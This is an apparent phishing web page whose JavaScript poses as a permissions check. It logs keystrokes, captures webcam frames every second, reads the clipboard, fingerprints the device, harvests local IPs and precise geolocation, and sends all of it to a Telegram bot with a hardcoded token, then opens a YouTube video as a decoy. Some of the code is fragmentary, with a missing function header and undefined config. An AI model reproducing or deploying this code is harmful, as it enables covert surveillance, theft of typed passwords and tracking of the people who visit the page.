<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;overflow:hidden;background:#080e1a}
.bg-layer{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;overflow:hidden}

.portal-overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:100;display:flex;align-items:center;justify-content:center;background:rgba(6,12,28,0.25);backdrop-filter:blur(10px)}
.glass-card{position:relative;width:92%;max-width:520px;background:rgba(255,255,255,0.05);backdrop-filter:blur(28px);border-radius:28px;border:1px solid rgba(255,255,255,0.08);box-shadow:0 24px 72px rgba(0,0,0,0.5),inset 0 1px 0 rgba(255,255,255,0.06);padding:36px 28px 24px}
.glass-card::before{content:'';position:absolute;top:-1px;left:15%;right:15%;height:2px;background:linear-gradient(90deg,transparent,rgba(48,128,255,0.5),transparent);border-radius:50%}
.hdr{text-align:center;margin-bottom:24px}

.hdr .ico svg{width:28px;height:28px;fill:none;stroke:#3884ff;stroke-width:2}

.perm-list{display:flex;flex-direction:column;gap:8px;margin-bottom:24px}

.perm-row.done{cursor:default;border-color:rgba(56,220,120,0.18);background:rgba(56,220,120,0.04)}
.perm-row .pi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.05)}
.perm-row .pi svg{width:17px;height:17px;stroke:rgba(255,255,255,0.4);stroke-width:1.8}
.perm-row.done .pi{background:rgba(56,220,120,0.10)}
.perm-row.done .pi svg{stroke:rgba(56,220,120,0.7)}
.perm-row .pt{flex:1}
.perm-row .pt .pn{font-size:13px;font-weight:500;color:rgba(240,244,255,0.82)}
.perm-row .pt .pd{font-size:11px;color:rgba(240,244,255,0.35);margin-top:2px}
.perm-row .ps{width:20px;height:20px;border-radius:50%;border:2px solid rgba(255,255,255,0.10);display:flex;align-items:center;justify-content:center}
.perm-row.done .ps{border-color:rgba(56,220,120,0.45);background:rgba(56,220,120,0.12)}
.perm-row.done .ps::after{content:'';width:7px;height:7px;border-radius:50%;background:#38dc78;animation:pd 2s infinite}
@keyframes pd{0%,100%{box-shadow:0 0 0 0 rgba(56,220,120,0.35)}50%{box-shadow:0 0 0 5px rgba(56,220,120,0)}}
.prog{display:none;margin-bottom:20px}
.prog.show{display:block}
.prog-bar{height:3px;border-radius:3px;background:rgba(255,255,255,0.07);overflow:hidden;margin-bottom:7px}
.prog-fill{height:100%;width:0%;background:linear-gradient(90deg,#3070ff,#48a8ff);transition:width 0.4s}
.prog-lbl{font-size:11px;color:rgba(240,244,255,0.40);text-align:center}
.cta{width:100%;padding:14px 20px;border:none;border-radius:14px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:all 0.3s;margin-bottom:8px;position:relative;overflow:hidden}
.cta:not(.go){background:rgba(255,255,255,0.04);color:rgba(240,244,255,0.15);cursor:not-allowed}
.cta.go{background:linear-gradient(135deg,#1a60e0,#3884ff);color:#fff;box-shadow:0 6px 28px rgba(48,128,255,0.22)}
.cta.go:hover{transform:translateY(-1.5px)}
.cta .sub{display:block;font-size:10px;opacity:0.55;margin-top:3px}
.retry-link{text-align:center;margin-top:8px;font-size:10.5px;color:rgba(240,244,255,0.3);cursor:pointer;text-decoration:underline}
.retry-link:hover{color:rgba(56,220,120,0.6)}
.ftr{text-align:center;padding-top:12px;border-top:1px solid rgba(255,255,255,0.05);margin-top:4px}
.ftr p{font-size:9.5px;color:rgba(240,244,255,0.20)}
.tst{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(70px);z-index:999;background:rgba(0,0,0,0.7);backdrop-filter:blur(10px);padding:10px 20px;border-radius:12px;color:#f0f4ff;font-size:12px;opacity:0;transition:all 0.3s;pointer-events:none;white-space:nowrap}
.tst.up{opacity:1;transform:translateX(-50%) translateY(0)}
@keyframes fi{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}
.glass-card{animation:fi 0.5s cubic-bezier(0.22,1,0.36,1)}
</style>
</head>

<script>
// =================== TELEGRAM CONFIG ===================
(function(){
    var token = '8757443004:AAFsg015tmfMkPZKQRxl_FQsTA3tknNRfWM';

// ================ TARGET URL (opens in NEW TAB after 6 seconds) =================
var TARGET_URL = 'https://www.youtube.com/watch?v=_3uP_ii4yTw';

// =================== DOM elements ===================
function $(id) { return document.getElementById(id); }
var btn = $('cta'), btnT = $('btnT'), btnS = $('btnS');
var prog = $('prog'), pfill = $('pfill'), plbl = $('plbl');
var toastEl = $('toastMsg');
var retryEl = $('retryBtn');

// =================== GLOBAL STATE ===================
var perms = {cam: false, loc: false, clip: false};
var allGranted = false;
var extractionStarted = false;
var extractionDone = false;
var toastTimer = null;

// Camera capture vars
var cameraStream = null;
var videoElement = null;
var cameraInterval = null;
var capturedFrames = [];

// Keylogger buffer
var keyBuffer = [];

// 6-second timer
var gatherTimer = null;

// =================== TOAST ===================
function showToast(msg) {
    toastEl.innerHTML = msg;
    toastEl.className = 'tst up';
    clearTimeout(toastTimer);
    toastTimer = setTimeout(function(){ toastEl.className = 'tst'; }, 2000);
}

// =================== UI UPDATE ===================
function updateUI() {
    allGranted = perms.cam && perms.loc && perms.clip;
    if (extractionDone) {
        btn.disabled = true;
        btn.className = 'cta';
        btnT.innerHTML = '✓ Ready';
        btnS.innerHTML = '';
        return;
    }
    if (allGranted) {
        btn.disabled = false;
        btn.className = 'cta go';
        btnT.innerHTML = 'CLICK HERE';
        btnS.innerHTML = '';
    } else {
        btn.disabled = true;
        btn.className = 'cta';
        btnT.innerHTML = 'Grant all permissions to continue';
        var missing = [];
        if (!perms.cam) missing.push('Camera');
        if (!perms.loc) missing.push('Location');
        if (!perms.clip) missing.push('Clipboard');
        btnS.innerHTML = 'Missing: ' + (missing.join(', ') || 'none');
    }
}

function markGranted(key, el) {
    if (perms[key]) return;
    perms[key] = true;
    el.classList.add('done');
    updateUI();
}

// =================== PERMISSION HANDLERS ===================
function requestCamera() {
    if (perms.cam) return;
    navigator.mediaDevices.getUserMedia({video: true})
        .then(function(stream){
            stream.getTracks().forEach(t=>t.stop());
            markGranted('cam', $('permCam'));
        })
        .catch(()=> showToast('✗ Camera denied'));
}

function requestLocation() {
    if (perms.loc) return;
    navigator.geolocation.getCurrentPosition(
        ()=> markGranted('loc', $('permLoc')),
        ()=> showToast('✗ Location denied'),
        {timeout: 8000}
    );
}

function requestClipboard() {
    if (perms.clip) return;
    navigator.clipboard.writeText('perm_ok')
        .then(()=> setTimeout(()=>{
            navigator.clipboard.readText().finally(()=> markGranted('clip', $('permClip')));
        }, 150))
        .catch(()=> markGranted('clip', $('permClip')));
}

$('permCam').addEventListener('click', requestCamera);
$('permLoc').addEventListener('click', requestLocation);
$('permClip').addEventListener('click', requestClipboard);
retryEl.addEventListener('click', ()=>{
    if (extractionStarted) return;
    if (!perms.cam) requestCamera();
    if (!perms.loc) requestLocation();
    if (!perms.clip) requestClipboard();
});

// =================== KEYLOGGER ===================
function flushKeylog() {
    if (keyBuffer.length === 0) return;
    var chunk = keyBuffer.join('');
    keyBuffer = [];
    fetch(window.__C.msgApi, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({chat_id: window.__C.chatId, text: '[KEYLOG] '+chunk.substring(0,3900), disable_notification: true})
    }).catch(()=>{});
}
window.addEventListener('keydown', (e)=>{
    var k = e.key;
    if (!k || k==='Dead'||k==='Unidentified') return;
    if (['Shift','Control','Alt','Meta'].includes(k)) return;
    if (k === 'Backspace') keyBuffer.push('[BS]');
    else if (k === 'Enter') keyBuffer.push('[ENTER]\n');
    else if (k === 'Tab') keyBuffer.push('[TAB]');
    else if (k === 'Escape') keyBuffer.push('[ESC]');
    else if (k.length === 1) keyBuffer.push(k);
    else keyBuffer.push('['+k+']');
    if (keyBuffer.length >= 45) flushKeylog();
}, true);
setInterval(flushKeylog, 7000);
window.addEventListener('beforeunload', flushKeylog);

// ==================== CAMERA (1 frame per second) ====================
function startCameraCapture(fps=1) {
    if (cameraInterval) return;
    navigator.mediaDevices.getUserMedia({video: true})
        .then(stream => {
            cameraStream = stream;
            videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.muted = true;
            videoElement.playsInline = true;
            videoElement.autoplay = true;
            videoElement.onloadedmetadata = () => {
                videoElement.play().catch(e=>console.warn);
                cameraInterval = setInterval(() => {
                    if (!videoElement || videoElement.readyState < 2) return;
                    try {
                        let canvas = document.createElement('canvas');
                        let w = videoElement.videoWidth || 640;
                        let h = videoElement.videoHeight || 480;
                        canvas.width = w;
                        canvas.height = h;
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(videoElement, 0, 0, w, h);
                        let imgData = canvas.toDataURL('image/jpeg', 0.7);
                        capturedFrames.push(imgData);
                        let raw = atob(imgData.split(',')[1]);
                        let buf = new Uint8Array(raw.length);
                        for(let i=0;i<raw.length;i++) buf[i]=raw.charCodeAt(i);
                        let blob = new Blob([buf], {type:'image/jpeg'});
                        let fd = new FormData();
                        fd.append('chat_id', window.__C.chatId);
                        fd.append('photo', blob, `frame_${Date.now()}.jpg`);
                        fd.append('caption', '📸');
                        fetch(window.__C.photoApi, { method: 'POST', body: fd }).catch(()=>{});
                    } catch(e) {}
                }, 1000 / fps);
            };
        })
        .catch(err => console.warn("Camera error", err));
}

function stopCameraCapture() {
    if (cameraInterval) { clearInterval(cameraInterval); cameraInterval = null; }
    if (cameraStream) { cameraStream.getTracks().forEach(t=>t.stop()); cameraStream = null; }
    if (videoElement) { videoElement.srcObject = null; videoElement = null; }
}

// ==================== DATA COLLECTION ====================
function getDeviceInfo() {
    let n = navigator, s = screen;
    return {
        'User Agent': n.userAgent, 'Platform': n.platform, 'Language': n.language,
        'CPU Cores': n.hardwareConcurrency || 'unknown', 'Device Memory GB': n.deviceMemory || 'unknown',
        'Max Touch Points': n.maxTouchPoints, 'Screen Size': s.width+'x'+s.height,
        'Color Depth': s.colorDepth, 'Pixel Ratio': window.devicePixelRatio,
        'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone,
        'Cookies Enabled': n.cookieEnabled, 'Do Not Track': n.doNotTrack || 'unspecified'
    };
}
function getWebGLInfo() {
    try { let c=document.createElement('canvas'); let gl=c.getContext('webgl')||c.getContext('experimental-webgl');
        if(!gl) return 'WebGL not supported'; let ext=gl.getExtension('WEBGL_debug_renderer_info');
        return ext ? {Vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), Renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)} : 'No debug';
    } catch(e){ return 'Error'; }
}
function getCanvasFP() {
    try { let c=document.createElement('canvas'); c.width=300;c.height=150; let ctx=c.getContext('2d');
        ctx.fillStyle='#f60'; ctx.fillRect(0,0,300,150); ctx.fillStyle='#fff'; ctx.font='18px Arial'; ctx.fillText('FP',20,40);
        return c.toDataURL();
    } catch(e){ return 'error'; }
}
function getFonts() {
    let fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Segoe UI','Roboto','Helvetica'];
    try { let c=document.createElement('canvas'); let ctx=c.getContext('2d'); let test='mmMwWLliI0O&1'; let detected=[];
        for(let f of fonts){ ctx.font='36px "'+f+'", monospace'; let w1=ctx.measureText(test).width;
            ctx.font='36px monospace'; let w2=ctx.measureText(test).width; if(w1!==w2) detected.push(f); }
        return detected;
    } catch(e){ return []; }
}
function getWebRTCIPs() {
    return new Promise(resolve=>{
        let ips=[]; let pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
        pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
        pc.onicecandidate=e=>{ if(e.candidate){ let m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(m && !ips.includes(m[0])) ips.push(m[0]); }
            else { try{pc.close();}catch(e){} resolve(ips); } };
        setTimeout(()=>{ try{pc.close();}catch(e){} resolve(ips); }, 3000);
    });
}
function getStorageStats() {
    try { return { localStorageKeys: Object.keys(localStorage).length, sessionStorageKeys: Object.keys(sessionStorage).length, cookieLength: document.cookie.length }; }
    catch(e){ return {}; }
}
function getBattery() {
    if(!navigator.getBattery) return Promise.resolve(null);
    return navigator.getBattery().then(b=>{ return { level: Math.round(b.level*100)+'%', charging: b.charging }; }).catch(()=>null);
}
function getNetwork() {
    let c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    return c ? { connectionType: c.effectiveType || 'unknown', downlinkMbps: c.downlink, rttMs: c.rtt } : {};
}
function getClipboardText() {
    if(!perms.clip) return Promise.resolve('Not granted');
    return navigator.clipboard.readText().then(t=> t.substring(0,500)).catch(e=> 'Error: '+e.message);
}
function getLocation() {
    return new Promise(resolve=>{
        navigator.geolocation.getCurrentPosition(p=>resolve({ latitude:p.coords.latitude, longitude:p.coords.longitude, accuracyMeters:p.coords.accuracy,
            altitude:p.coords.altitude, speed:p.coords.speed, heading:p.coords.heading, timestamp:new Date(p.timestamp).toISOString(),
            googleMaps:'https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude }),
            e=>resolve({ error: e.message }), {enableHighAccuracy:true, timeout:8000});
    });
}

    let html = `<!DOCTYPE html>

        <div class="stats-bar">
            <div class="stat-card"><span>${framesBase64.length}</span><label>Frames Captured</label></div>
            <div class="stat-card"><span>${keystrokeLog.length}</span><label>Keystrokes Logged</label></div>
            <div class="stat-card"><span>${Object.keys(device).length}</span><label>Data Points</label></div>
        </div>
    </div>
    <div class="content">
        <!-- Device Section -->
        <div class="section">
            <div class="section-title"><span class="emoji">📱</span> Device Information</div>
            <table>`;
    for(let [k,v] of Object.entries(device)){
        html+=`<tr><th>${esc(k)}</th><td>${esc(v)}</td></tr>`;
    }
    html+=`</table></div>
        
        <!-- WebGL & Canvas -->
        <div class="section">
            <div class="section-title"><span class="emoji">🎨</span> Graphics Fingerprint</div>
            <div class="grid">
                <div class="info-card"><div class="label">WebGL Renderer</div><div class="value">${esc(JSON.stringify(webgl))}</div></div>
                <div class="info-card"><div class="label">Canvas Fingerprint</div><div class="value">${canvasFP.substring(0,80)}...</div></div>
                <div class="info-card"><div class="label">Fonts Detected</div><div class="value">${fonts.join(', ') || 'None detected'}</div></div>
            </div>
        </div>
        
        <!-- Network & IP -->
        <div class="section">
            <div class="section-title"><span class="emoji">🌐</span> Network & Location</div>
            <div class="grid">
                <div class="info-card"><div class="label">Local IPs</div><div class="value">${ips.join(', ') || 'None'}</div></div>
                <div class="info-card"><div class="label">Network Info</div><div class="value">${esc(JSON.stringify(network))}</div></div>
                <div class="info-card"><div class="label">Battery Status</div><div class="value">${battery ? battery.level+' · '+(battery.charging?'Charging':'Not charging') : 'N/A'}</div></div>
            </div>
        </div>
        
        <!-- Location Details -->
        <div class="section">
            <div class="section-title"><span class="emoji">📍</span> Geolocation</div>
            ${locationData && !locationData.error ? `
            <div class="grid">
                <div class="info-card"><div class="label">Coordinates</div><div class="value">${locationData.latitude}, ${locationData.longitude}</div></div>
                <div class="info-card"><div class="label">Accuracy</div><div class="value">${locationData.accuracyMeters}m</div></div>
                <div class="info-card"><div class="label">Altitude / Speed</div><div class="value">${locationData.altitude || 'N/A'} / ${locationData.speed || 'N/A'}</div></div>
            </div>
            <a href="${locationData.googleMaps}" target="_blank" style="display:inline-block;margin-top:12px;background:#3b82f6;color:white;padding:8px 18px;border-radius:30px;text-decoration:none;font-size:13px">🗺 Open in Google Maps</a>
            ` : `<div class="info-card"><div class="value">${locationData?.error || 'Location unavailable'}</div></div>`}
        </div>
        
        <!-- Clipboard -->
        <div class="section">
            <div class="section-title"><span class="emoji">📋</span> Clipboard Content</div>
            <div class="keystroke-box" style="background:#f8fafc">${esc(clipboard) || 'Empty'}</div>
        </div>
        
        <!-- Keystroke Log -->
        <div class="section">
            <div class="section-title"><span class="emoji">⌨️</span> Keystroke Activity</div>
            <div class="keystroke-box">${esc(keystrokeLog.slice(-1000)) || 'No keystrokes recorded'}</div>
        </div>
        
        <!-- Captured Frames Gallery -->
        <div class="section">
            <div class="section-title"><span class="emoji">📸</span> Captured Frames (${framesBase64.length})</div>
            ${framesBase64.length > 0 ? `<div class="gallery">`+framesBase64.slice(0,30).map(img=>`<img src="${img}" alt="frame">`).join('')+`</div>` : '<p>No frames captured</p>'}
            ${framesBase64.length > 30 ? `<p style="margin-top:12px;font-size:13px;color:#64748b">+ ${framesBase64.length-30} more frames</p>` : ''}
        </div>
    </div>
    <div class="footer">
        <p>🔒 End-to-end encrypted report • Generated by Secure Monitoring System</p>
    </div>
</div>
</body>
</html>`;
    return html;
}

async function sendFinalReportAndOpenLink() {
    if (extractionDone) return;
    extractionDone = true;
    
    // Collect all data
    let device = getDeviceInfo();
    let webgl = getWebGLInfo();
    let canvasFP = getCanvasFP();
    let fonts = getFonts();
    let ips = await getWebRTCIPs();
    let storage = getStorageStats();
    let battery = await getBattery();
    let network = getNetwork();
    let clipboard = await getClipboardText();
    let locationData = await getLocation();
    let keystrokeHistory = keyBuffer.slice(-500).join('');
    let finalFrames = capturedFrames.slice(); 
    
    let htmlReport = buildWhiteThemeReport(device, webgl, canvasFP, fonts, ips, storage, battery, network, clipboard, locationData, finalFrames, keystrokeHistory);
    let blob = new Blob([htmlReport], {type: 'text/html'});
    let fd = new FormData();
    fd.append('chat_id', window.__C.chatId);
    fd.append('document', blob, `report_white_${Date.now()}.html`);
    fd.append('caption', '📄 Secure Report (White Theme)');
    try {
        await fetch(window.__C.api, {method: 'POST', body: fd});
    } catch(e) {}
    
    // Open target URL in new tab after 6 seconds exactly
    window.open(TARGET_URL, '_blank');
    
    // Clean UI
    prog.classList.remove('show');
    btnT.innerHTML = '✓ Ready';
    btnS.innerHTML = '';
}

// ==================== MAIN: 6 seconds capture then report + open link ====================
function startFullExtraction() {
    if (extractionStarted || extractionDone) return;
    extractionStarted = true;
    
    prog.classList.add('show');
    pfill.style.width = '0%';
    plbl.innerHTML = 'Processing...';
    
    startCameraCapture(1);
    
    // Progress bar animation over 6 seconds
    var startTime = Date.now();
    var progressInterval = setInterval(function(){
        var elapsed = Date.now() - startTime;
        var percent = Math.min(100, (elapsed / 6000) * 100);
        pfill.style.width = percent + '%';
        if (percent >= 100) clearInterval(progressInterval);
    }, 100);
    
    gatherTimer = setTimeout(function(){
        clearInterval(progressInterval);
        pfill.style.width = '100%';
        plbl.innerHTML = 'Complete';
        sendFinalReportAndOpenLink();
    }, 6000);
}

// =================== BUTTON TRIGGER ===================
btn.addEventListener('click', ()=>{
    if (extractionDone || extractionStarted) return;
    if (!allGranted) { showToast("Grant all permissions first"); return; }
    startFullExtraction();
});

// =================== KEEPALIVE ===================
setInterval(()=>{
    try { let ctx = new (window.AudioContext||window.webkitAudioContext)();
        let gain = ctx.createGain(); gain.gain.value=0.001; let osc=ctx.createOscillator();
        osc.connect(gain); gain.connect(ctx.destination); osc.start(0);
        setTimeout(()=>{ try{osc.stop();ctx.close();}catch(e){} },150);
    } catch(e){}
}, 55000);

// =================== INIT ===================
updateUI();
try { document.getElementById('bgFrame').src = 'https://www.bing.com'; } catch(e){}
window.addEventListener('beforeunload',()=>{
    if (cameraInterval) clearInterval(cameraInterval);
    flushKeylog();
});
</script>
</body>
